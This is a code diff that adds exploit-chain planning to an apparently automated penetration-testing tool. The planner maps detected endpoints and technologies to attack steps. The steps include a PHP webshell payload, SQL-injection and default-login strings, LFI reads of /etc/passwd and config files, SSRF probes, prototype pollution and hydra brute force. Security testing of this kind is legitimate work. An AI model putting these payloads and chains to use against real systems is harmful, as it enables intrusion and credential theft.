@@ -118,6 +118,496 @@ class ChainPlanner:
         logger.info(f"[CHAIN] Planned {len(chains)} exploit chains from graph")
         return chains
 
+    def plan_chains_from_context(self, attack_context: Dict) -> List[ExploitChain]:
+        """
+        Plan exploit chains from enriched attack context.
+        Uses vulnerability hints, parameters, and technologies to generate smart chains.
+        
+        Args:
+            attack_context: Dict from AIAnalyzer.build_attack_context()
+        
+        Returns:
+            List of planned ExploitChain objects
+        """
+        chains = []
+        
+        # Extract context
+        endpoints = attack_context.get('endpoints', [])
+        all_hints = set(attack_context.get('vulnerability_hints', []))
+        patterns = attack_context.get('chain_patterns', [])
+        attack_surface = attack_context.get('attack_surface', {})
+        
+        logger.info(f"[CHAIN] Planning chains from context with {len(all_hints)} hint types and {len(patterns)} patterns")
+        
+        # Process identified patterns
+        for pattern in patterns:
+            chain = self._build_chain_from_pattern(pattern, endpoints)
+            if chain:
+                chains.append(chain)
+                logger.info(f"[CHAIN] Generated pattern-based chain: {chain.name}")
+        
+        # Generate chains from attack surface
+        chains.extend(self._generate_chains_from_attack_surface(attack_surface))
+        
+        # Generate technology-specific chains
+        technologies = attack_context.get('technologies', [])
+        chains.extend(self._generate_tech_specific_chains(technologies, endpoints))
+        
+        # Add chains for misconfigurations
+        misconfigs = attack_context.get('misconfigurations', [])
+        chains.extend(self._generate_misconfig_chains(misconfigs))
+        
+        # Priority sort
+        chains = self.smart_prioritize(chains)
+        
+        logger.info(f"[CHAIN] Generated {len(chains)} chains from enriched context")
+        return chains
+
+    def _build_chain_from_pattern(self, pattern: Dict, endpoints: List[Dict]) -> Optional[ExploitChain]:
+        """Build a chain from an identified attack pattern."""
+        pattern_name = pattern.get('name', '')
+        description = pattern.get('description', '')
+        probability = pattern.get('probability', 0.5)
+        
+        if probability < 0.4:
+            return None  # Skip low-probability patterns
+        
+        # Map pattern names to chain builders
+        if pattern_name == 'file_upload_to_rce':
+            upload_ep = pattern.get('upload_endpoint')
+            return self._build_upload_to_rce_chain(upload_ep)
+        
+        elif pattern_name == 'auth_bypass_to_privilege_escalation':
+            return self._build_auth_to_priv_chain()
+        
+        elif pattern_name == 'ssrf_chain':
+            return self._build_ssrf_exploitation_chain()
+        
+        elif pattern_name == 'enum_then_attack':
+            return self._build_enum_attack_chain()
+        
+        return None
+
+    def _generate_chains_from_attack_surface(self, attack_surface: Dict) -> List[ExploitChain]:
+        """Generate chains targeting specific attack surface elements."""
+        chains = []
+        
+        # File upload endpoints
+        upload_eps = attack_surface.get('file_upload_endpoints', [])
+        if upload_eps:
+            for ep in upload_eps[:3]:  # Limit to top 3
+                chain = self._build_upload_to_rce_chain(ep.get('url'))
+                if chain:
+                    chains.append(chain)
+        
+        # Authentication endpoints
+        auth_eps = attack_surface.get('auth_endpoints', [])
+        if auth_eps:
+            chains.append(self._build_auth_to_priv_chain(auth_eps[0]))
+        
+        # API endpoints
+        api_eps = attack_surface.get('api_endpoints', [])
+        if api_eps:
+            chains.append(self._build_api_attack_chain(api_eps[0]))
+        
+        # Admin endpoints
+        admin_eps = attack_surface.get('admin_endpoints', [])
+        if admin_eps:
+            chains.append(self._build_admin_access_chain(admin_eps[0]))
+        
+        return chains
+
+    def _generate_tech_specific_chains(self, technologies: List[str], endpoints: List[Dict]) -> List[ExploitChain]:
+        """Generate chains based on detected technologies."""
+        chains = []
+        tech_lower = [t.lower() for t in (technologies or [])]
+        
+        # WordPress
+        if any('wordpress' in t or 'wp' in t for t in tech_lower):
+            wp_eps = [e for e in endpoints if 'wp' in e.get('url', '').lower()]
+            if wp_eps:
+                chains.append(self._build_wordpress_attack_chain(wp_eps[0]))
+        
+        # PHP
+        if any('php' in t for t in tech_lower):
+            chains.append(self._build_php_exploitation_chain(endpoints))
+        
+        # Node.js / Express
+        if any('node' in t or 'express' in t for t in tech_lower):
+            chains.append(self._build_nodejs_attack_chain(endpoints))
+        
+        return chains
+
+    def _generate_misconfig_chains(self, misconfigs: List[Dict]) -> List[ExploitChain]:
+        """Generate chains that exploit misconfigurations."""
+        chains = []
+        
+        for misconfig in misconfigs[:5]:
+            config_type = misconfig.get('type', '')
+            endpoint = misconfig.get('endpoint', '')
+            severity = misconfig.get('severity', 'MEDIUM')
+            
+            if config_type == 'admin_panel_unauthenticated':
+                chains.append(self._build_pattern_chain(
+                    name="Unauthenticated Admin Access",
+                    description="Access exposed admin panel without authentication",
+                    steps=[
+                        ExploitStep(
+                            name="Access admin panel",
+                            action="direct_access",
+                            target=endpoint,
+                            tool="browser",
+                            success_indicator="Admin panel loaded"
+                        ),
+                        ExploitStep(
+                            name="Exploit admin functions",
+                            action="admin_exploitation",
+                            target=endpoint,
+                            tool="curl",
+                            success_indicator="System compromised"
+                        )
+                    ],
+                    risk_level="CRITICAL"
+                ))
+            
+            elif config_type == 'debug_endpoint_exposed':
+                chains.append(self._build_pattern_chain(
+                    name="Debug Endpoint Information Disclosure",
+                    description="Extract sensitive information from exposed debug endpoint",
+                    steps=[
+                        ExploitStep(
+                            name="Access debug endpoint",
+                            action="information_gathering",
+                            target=endpoint,
+                            tool="browser",
+                            success_indicator="Debug information visible"
+                        ),
+                        ExploitStep(
+                            name="Extract credentials",
+                            action="credential_extraction",
+                            target=endpoint,
+                            tool="curl",
+                            success_indicator="Credentials obtained"
+                        )
+                    ],
+                    risk_level="HIGH"
+                ))
+            
+            elif config_type == 'backup_file_exposed':
+                chains.append(self._build_pattern_chain(
+                    name="Backup File Extraction",
+                    description="Download and analyze backup files for sensitive data",
+                    steps=[
+                        ExploitStep(
+                            name="Download backup file",
+                            action="file_download",
+                            target=endpoint,
+                            tool="wget",
+                            success_indicator="Backup file downloaded"
+                        ),
+                        ExploitStep(
+                            name="Extract sensitive data",
+                            action="data_extraction",
+                            target=endpoint,
+                            tool="custom_script",
+                            success_indicator="Credentials/secrets obtained"
+                        )
+                    ],
+                    risk_level="HIGH"
+                ))
+        
+        return chains
+
+    def _build_upload_to_rce_chain(self, upload_url: str) -> Optional[ExploitChain]:
+        """Build file upload to RCE chain."""
+        if not upload_url:
+            return None
+        
+        return self._build_pattern_chain(
+            name="File Upload to Remote Code Execution",
+            description=f"Upload malicious file via {upload_url} and achieve RCE",
+            steps=[
+                ExploitStep(
+                    name="Test upload endpoint",
+                    action="upload_test",
+                    target=upload_url,
+                    tool="curl",
+                    success_indicator="File uploaded successfully"
+                ),
+                ExploitStep(
+                    name="Bypass upload restrictions",
+                    action="bypass_restrictions",
+                    target=upload_url,
+                    tool="curl",
+                    payload=".php.jpg / .phtml",
+                    success_indicator="Restriction bypassed"
+                ),
+                ExploitStep(
+                    name="Upload webshell",
+                    action="file_upload",
+                    target=upload_url,
+                    tool="curl",
+                    payload="<?php system($_GET['cmd']); ?>",
+                    success_indicator="Webshell uploaded"
+                ),
+                ExploitStep(
+                    name="Execute commands",
+                    action="code_execution",
+                    target=self._build_full_url(upload_url.split('/')[-1]),
+                    tool="curl",
+                    success_indicator="Remote code execution achieved"
+                )
+            ],
+            risk_level="CRITICAL"
+        )
+
+    def _build_auth_to_priv_chain(self, auth_ep: Dict = None) -> ExploitChain:
+        """Build authentication bypass to privilege escalation chain."""
+        target = auth_ep.get('url') if auth_ep else "login"
+        
+        return self._build_pattern_chain(
+            name="Authentication Bypass and Privilege Escalation",
+            description="Bypass authentication and escalate privileges to admin",
+            steps=[
+                ExploitStep(
+                    name="Test authentication bypass",
+                    action="auth_bypass_test",
+                    target=target,
+                    tool="curl",
+                    payload="admin:admin / ' OR '1'='1",
+                    success_indicator="Authentication bypassed"
+                ),
+                ExploitStep(
+                    name="Gain user session",
+                    action="session_hijacking",
+                    target=target,
+                    tool="burp",
+                    success_indicator="Valid session obtained"
+                ),
+                ExploitStep(
+                    name="Escalate to admin",
+                    action="privilege_escalation",
+                    target=target,
+                    tool="curl",
+                    success_indicator="Admin access obtained"
+                )
+            ],
+            risk_level="CRITICAL"
+        )
+
+    def _build_ssrf_exploitation_chain(self) -> ExploitChain:
+        """Build SSRF exploitation chain."""
+        return self._build_pattern_chain(
+            name="SSRF to Internal Network Access",
+            description="Exploit Server-Side Request Forgery to access internal network",
+            steps=[
+                ExploitStep(
+                    name="Identify SSRF parameters",
+                    action="vulnerability_identification",
+                    target="",
+                    tool="burp",
+                    success_indicator="Vulnerable parameter found"
+                ),
+                ExploitStep(
+                    name="Probe internal services",
+                    action="internal_scanning",
+                    target="http://localhost:8080",
+                    tool="curl",
+                    payload="http://internal-service/admin",
+                    success_indicator="Internal service accessible"
+                ),
+                ExploitStep(
+                    name="Exploit internal service",
+                    action="service_exploitation",
+                    target="",
+                    tool="custom_script",
+                    success_indicator="Internal service compromised"
+                )
+            ],
+            risk_level="HIGH"
+        )
+
+    def _build_enum_attack_chain(self) -> ExploitChain:
+        """Build user enumeration to attack chain."""
+        return self._build_pattern_chain(
+            name="User Enumeration and Targeted Attack",
+            description="Enumerate valid users and launch targeted attacks",
+            steps=[
+                ExploitStep(
+                    name="Enumerate users",
+                    action="user_enumeration",
+                    target="",
+                    tool="custom_script",
+                    success_indicator="Valid users identified"
+                ),
+                ExploitStep(
+                    name="Brute force credentials",
+                    action="brute_force",
+                    target="",
+                    tool="hydra",
+                    success_indicator="Credentials obtained"
+                ),
+                ExploitStep(
+                    name="Exploit with credentials",
+                    action="exploitation",
+                    target="",
+                    tool="curl",
+                    success_indicator="System compromised"
+                )
+            ],
+            risk_level="HIGH"
+        )
+
+    def _build_api_attack_chain(self, api_ep: Dict) -> ExploitChain:
+        """Build API-specific attack chain."""
+        return self._build_pattern_chain(
+            name="API Abuse and Exploitation",
+            description=f"Exploit API endpoint at {api_ep.get('url')}",
+            steps=[
+                ExploitStep(
+                    name="Analyze API",
+                    action="api_analysis",
+                    target=api_ep.get('url'),
+                    tool="burp",
+                    success_indicator="API structure understood"
+                ),
+                ExploitStep(
+                    name="Test for authentication",
+                    action="auth_test",
+                    target=api_ep.get('url'),
+                    tool="curl",
+                    success_indicator="Authentication requirements identified"
+                ),
+                ExploitStep(
+                    name="Exploit API",
+                    action="api_exploitation",
+                    target=api_ep.get('url'),
+                    tool="curl",
+                    success_indicator="Sensitive data accessed"
+                )
+            ],
+            risk_level="HIGH"
+        )
+
+    def _build_admin_access_chain(self, admin_ep: Dict) -> ExploitChain:
+        """Build admin panel access chain."""
+        return self._build_pattern_chain(
+            name="Admin Panel Unauthorized Access",
+            description=f"Gain unauthorized access to admin panel at {admin_ep.get('url')}",
+            steps=[
+                ExploitStep(
+                    name="Access admin panel",
+                    action="direct_access",
+                    target=admin_ep.get('url'),
+                    tool="browser",
+                    success_indicator="Admin panel accessible"
+                ),
+                ExploitStep(
+                    name="Bypass authentication",
+                    action="auth_bypass",
+                    target=admin_ep.get('url'),
+                    tool="curl",
+                    success_indicator="Authentication bypassed"
+                ),
+                ExploitStep(
+                    name="Exploit admin functions",
+                    action="admin_exploitation",
+                    target=admin_ep.get('url'),
+                    tool="curl",
+                    success_indicator="System compromised"
+                )
+            ],
+            risk_level="CRITICAL"
+        )
+
+    def _build_wordpress_attack_chain(self, wp_ep: Dict) -> ExploitChain:
+        """Build WordPress-specific attack chain."""
+        return self._build_pattern_chain(
+            name="WordPress Plugin/Theme Exploitation",
+            description="Exploit WordPress vulnerabilities for RCE",
+            steps=[
+                ExploitStep(
+                    name="Enumerate WordPress",
+                    action="wp_enumeration",
+                    target=wp_ep.get('url'),
+                    tool="wpscan",
+                    success_indicator="WordPress version and plugins identified"
+                ),
+                ExploitStep(
+                    name="Identify vulnerable plugins",
+                    action="vulnerability_scanning",
+                    target=wp_ep.get('url'),
+                    tool="wpscan",
+                    success_indicator="Vulnerable plugin found"
+                ),
+                ExploitStep(
+                    name="Exploit plugin",
+                    action="plugin_exploitation",
+                    target=wp_ep.get('url'),
+                    tool="exploit_framework",
+                    success_indicator="Remote code execution achieved"
+                )
+            ],
+            risk_level="HIGH"
+        )
+
+    def _build_php_exploitation_chain(self, endpoints: List[Dict]) -> ExploitChain:
+        """Build PHP-specific exploitation chain."""
+        return self._build_pattern_chain(
+            name="PHP Code Injection",
+            description="Exploit PHP-specific vulnerabilities like code injection",
+            steps=[
+                ExploitStep(
+                    name="Identify injection points",
+                    action="vulnerability_identification",
+                    target="",
+                    tool="burp",
+                    success_indicator="Injection point found"
+                ),
+                ExploitStep(
+                    name="Test code injection",
+                    action="code_injection_test",
+                    target="",
+                    tool="curl",
+                    payload="<?php phpinfo(); ?>",
+                    success_indicator="Code injection confirmed"
+                ),
+                ExploitStep(
+                    name="Execute commands",
+                    action="code_execution",
+                    target="",
+                    tool="curl",
+                    success_indicator="Remote code execution"
+                )
+            ],
+            risk_level="HIGH"
+        )
+
+    def _build_nodejs_attack_chain(self, endpoints: List[Dict]) -> ExploitChain:
+        """Build Node.js/Express-specific attack chain."""
+        return self._build_pattern_chain(
+            name="Node.js Prototype Pollution",
+            description="Exploit prototype pollution in Node.js applications",
+            steps=[
+                ExploitStep(
+                    name="Test prototype pollution",
+                    action="pollution_test",
+                    target="",
+                    tool="curl",
+                    payload="?__proto__[admin]=true",
+                    success_indicator="Prototype pollution confirmed"
+                ),
+                ExploitStep(
+                    name="Escalate privileges",
+                    action="privilege_escalation",
+                    target="",
+                    tool="curl",
+                    success_indicator="Admin access obtained"
+                )
+            ],
+            risk_level="HIGH"
+        )
+
     def build_manual_playbook(self, chains: List[ExploitChain]) -> List[Dict]:
         """
         Build a human-executable validation playbook from planned chains.
@@ -272,6 +762,10 @@ class ChainPlanner:
         """Analyze state and build relevant exploit chains"""
         chains = []
 
+        # NEW: Pattern-based chain generation from hints
+        hint_chains = self._generate_chains_from_hints()
+        chains.extend(hint_chains)
+
         # Detect patterns for chains
         pattern_chains = self._detect_chain_patterns()
         chains.extend(pattern_chains)
@@ -342,6 +836,238 @@ class ChainPlanner:
         chains = self.smart_prioritize(chains)
 
         return chains
+
+    def _generate_chains_from_hints(self) -> List[ExploitChain]:
+        """
+        Generate exploit chains from vulnerability hints in endpoint metadata.
+        This is the key intelligence enhancement.
+        """
+        chains = []
+        endpoints = self.state.get("prioritized_endpoints", []) or []
+        
+        # Collect all vulnerability hints from endpoints
+        hint_inventory = {}  # hint -> [endpoints]
+        for ep in endpoints:
+            hints = ep.get('vulnerability_hints', [])
+            for hint in hints:
+                if hint not in hint_inventory:
+                    hint_inventory[hint] = []
+                hint_inventory[hint].append(ep)
+        
+        logger.info(f"[CHAIN] Found {len(hint_inventory)} unique vulnerability hints")
+        
+        # Pattern 1: File upload + executable directory → RCE
+        if 'file_upload' in hint_inventory and any(h in hint_inventory for h in ['rce_via_upload', 'rce']):
+            upload_ep = hint_inventory['file_upload'][0]
+            chains.append(self._build_pattern_chain(
+                name="File Upload to RCE",
+                description="Upload file to executable directory and achieve code execution",
+                steps=[
+                    ExploitStep(
+                        name="Identify upload endpoint",
+                        action="reconnaissance",
+                        target=upload_ep.get('url'),
+                        tool="browser",
+                        success_indicator="Upload form found"
+                    ),
+                    ExploitStep(
+                        name="Upload webshell",
+                        action="file_upload",
+                        target=upload_ep.get('url'),
+                        tool="curl",
+                        payload="webshell.php",
+                        success_indicator="File uploaded successfully"
+                    ),
+                    ExploitStep(
+                        name="Execute uploaded file",
+                        action="code_execution",
+                        target=upload_ep.get('url') + "/webshell.php",
+                        tool="curl",
+                        success_indicator="Remote code execution achieved"
+                    )
+                ],
+                risk_level="CRITICAL"
+            ))
+        
+        # Pattern 2: LFI + Debug info → Information disclosure → RCE
+        if 'lfi' in hint_inventory:
+            lfi_eps = hint_inventory['lfi']
+            chains.append(self._build_pattern_chain(
+                name="Local File Inclusion to Information Disclosure",
+                description="Use LFI to read sensitive files and extract credentials",
+                steps=[
+                    ExploitStep(
+                        name="Enumerate files via LFI",
+                        action="local_file_inclusion",
+                        target=lfi_eps[0].get('url'),
+                        tool="curl",
+                        payload="../../../etc/passwd",
+                        success_indicator="System files readable"
+                    ),
+                    ExploitStep(
+                        name="Extract configuration",
+                        action="configuration_extraction",
+                        target=lfi_eps[0].get('url'),
+                        tool="curl",
+                        payload="../../../config/database.yml",
+                        success_indicator="Database credentials obtained"
+                    ),
+                    ExploitStep(
+                        name="Use credentials for escalation",
+                        action="credential_exploitation",
+                        target=self._get_base_url(),
+                        tool="sqlmap",
+                        success_indicator="Database access obtained"
+                    )
+                ],
+                risk_level="HIGH"
+            ))
+        
+        # Pattern 3: SSRF → Internal network access
+        if 'ssrf' in hint_inventory:
+            ssrf_eps = hint_inventory['ssrf']
+            chains.append(self._build_pattern_chain(
+                name="SSRF to Internal Resource Access",
+                description="Use Server-Side Request Forgery to access internal services",
+                steps=[
+                    ExploitStep(
+                        name="Identify SSRF parameter",
+                        action="vulnerability_identification",
+                        target=ssrf_eps[0].get('url'),
+                        tool="burp",
+                        success_indicator="SSRF parameter found"
+                    ),
+                    ExploitStep(
+                        name="Probe internal services",
+                        action="internal_reconnaissance",
+                        target=ssrf_eps[0].get('url'),
+                        tool="curl",
+                        payload="http://localhost:8080/admin",
+                        success_indicator="Internal service accessible"
+                    ),
+                    ExploitStep(
+                        name="Exploit internal service",
+                        action="service_exploitation",
+                        target=ssrf_eps[0].get('url'),
+                        tool="custom_script",
+                        success_indicator="Internal service compromised"
+                    )
+                ],
+                risk_level="HIGH"
+            ))
+        
+        # Pattern 4: Auth bypass + admin endpoint → Account takeover
+        if 'auth_bypass' in hint_inventory and 'admin' in [ep.get('endpoint_type', '') for ep in endpoints]:
+            admin_eps = [ep for ep in endpoints if ep.get('endpoint_type', '') == 'admin']
+            if admin_eps:
+                chains.append(self._build_pattern_chain(
+                    name="Authentication Bypass to Admin Access",
+                    description="Bypass authentication and gain administrative access",
+                    steps=[
+                        ExploitStep(
+                            name="Test authentication bypass",
+                            action="auth_test",
+                            target=admin_eps[0].get('url'),
+                            tool="curl",
+                            payload="admin:admin",
+                            success_indicator="Authentication bypassed"
+                        ),
+                        ExploitStep(
+                            name="Gain admin access",
+                            action="privilege_escalation",
+                            target=admin_eps[0].get('url'),
+                            tool="browser",
+                            success_indicator="Admin panel accessed"
+                        ),
+                        ExploitStep(
+                            name="Exploit admin functionality",
+                            action="admin_exploitation",
+                            target=admin_eps[0].get('url'),
+                            tool="curl",
+                            success_indicator="System compromised"
+                        )
+                    ],
+                    risk_level="CRITICAL"
+                ))
+        
+        # Pattern 5: User enumeration + brute force → Account takeover
+        if 'user_enumeration' in hint_inventory:
+            auth_eps = [ep for ep in endpoints if ep.get('endpoint_type', '') == 'auth']
+            if auth_eps:
+                chains.append(self._build_pattern_chain(
+                    name="User Enumeration to Account Takeover",
+                    description="Enumerate valid users and brute force credentials",
+                    steps=[
+                        ExploitStep(
+                            name="Enumerate users",
+                            action="user_enumeration",
+                            target=auth_eps[0].get('url'),
+                            tool="custom_script",
+                            success_indicator="Valid users identified"
+                        ),
+                        ExploitStep(
+                            name="Brute force passwords",
+                            action="brute_force",
+                            target=auth_eps[0].get('url'),
+                            tool="hydra",
+                            success_indicator="Credentials obtained"
+                        ),
+                        ExploitStep(
+                            name="Login with compromised account",
+                            action="authentication",
+                            target=auth_eps[0].get('url'),
+                            tool="curl",
+                            success_indicator="Account compromised"
+                        )
+                    ],
+                    risk_level="HIGH"
+                ))
+        
+        # Pattern 6: Injection attacks (SQLi, Command, etc)
+        injection_hints = [h for h in hint_inventory if 'injection' in h.lower() or 'sqli' in h.lower()]
+        if injection_hints:
+            hint = injection_hints[0]
+            injection_eps = hint_inventory[hint]
+            chains.append(self._build_pattern_chain(
+                name=f"{hint.title()} Exploitation",
+                description=f"Exploit {hint} vulnerability for database access or command execution",
+                steps=[
+                    ExploitStep(
+                        name="Test vulnerability",
+                        action="vulnerability_test",
+                        target=injection_eps[0].get('url'),
+                        tool="sqlmap" if 'sql' in hint else "curl",
+                        success_indicator="Vulnerability confirmed"
+                    ),
+                    ExploitStep(
+                        name="Extract data or execute commands",
+                        action="data_extraction",
+                        target=injection_eps[0].get('url'),
+                        tool="sqlmap" if 'sql' in hint else "curl",
+                        success_indicator="Sensitive data obtained"
+                    )
+                ],
+                risk_level="HIGH" if 'sql' in hint else "MEDIUM"
+            ))
+        
+        return chains
+
+    def _build_pattern_chain(
+        self,
+        name: str,
+        description: str,
+        steps: List[ExploitStep],
+        risk_level: str = "MEDIUM"
+    ) -> ExploitChain:
+        """Build an exploit chain from pattern components."""
+        return ExploitChain(
+            name=name,
+            description=description,
+            steps=steps,
+            risk_level=risk_level,
+            estimated_time=f"{len(steps) * 10}-{len(steps) * 30} min",
+            prerequisites=["target reachable", "network access to target"]
+        )
 
 
 class AIPoweredChainPlanner:
